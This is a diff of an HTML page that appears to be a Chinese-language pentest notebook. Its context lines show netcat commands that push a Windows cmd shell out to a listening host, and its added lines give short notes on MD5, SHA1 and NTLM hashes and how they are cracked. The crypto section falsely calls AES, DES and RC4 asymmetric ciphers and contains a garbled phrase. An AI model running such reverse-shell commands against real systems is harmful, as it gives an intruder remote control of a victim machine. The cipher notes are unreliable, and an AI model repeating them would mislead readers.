@@ -410,7 +410,34 @@ nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354
 nc -t -e cmd 192.168.153.140 5555
 讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口
 </code></pre>
-<h1 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2.加解密"></a>2.加解密</h1>
+<h1 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2.加解密"></a>2.加解密</h1><pre><code class="md5">md5
+ 16位和32位 0-9 和a-f 组成的字符串
+ 
+ 
+ 解密：
+ 1.知道算法
+ 2.碰撞枚举生成密文
+ 
+ 
+ 
+ 有特殊情况。md5会加salt一个字符串。
+
+    discuz
+</code></pre>
+<pre><code class="sha1">SHA1
+和md5特征差不多，只是位数是40
+</code></pre>
+<pre><code class="NTLM">NTLM
+WINDOWS系统哈希密码，标准通讯安全协议
+win7之后使用的密码
+之前是LM
+</code></pre>
+<pre><code>aes，des，rc4
+都是非对称加密。印度密钥，密文特质与base64类似
+</code></pre>
+<pre><code>
+</code></pre>
+
     
 
     
